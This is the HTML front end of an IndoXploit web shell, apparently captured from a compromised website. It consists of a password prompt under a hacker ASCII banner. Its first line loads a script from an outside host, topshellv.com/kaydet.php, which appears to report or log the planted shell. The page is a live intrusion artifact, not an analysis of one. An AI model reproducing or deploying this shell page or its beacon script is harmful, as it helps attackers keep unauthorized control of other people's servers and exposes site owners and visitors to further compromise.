<script src="https://www.topshellv.com/kaydet.php" type="e8527b7747ef3592f770e44d-text/javascript"></script><!DOCTYPE HTML>
<html>
<head>
<title>IndoXploit</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: green;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: transparent;
	border: 1px dotted green;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<header>
<pre> ___________________________
< <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="96e4f9f9e2d6fff8f2f9eee6faf9ffe2">[email&#160;protected]</a>:~# w00t??? >
 ---------------------------
   \         ,        ,
    \       /(        )`
     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\
           / /   | `    \
           O O   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __   \
<----|====O)))==) \) /====>
<----'    `--' `.__,' \
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \
      `--{__________)        \/
	</pre>
</header>
<form method="post">
<input type="password" name="password">
</form>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="e8527b7747ef3592f770e44d-|49" defer=""></script>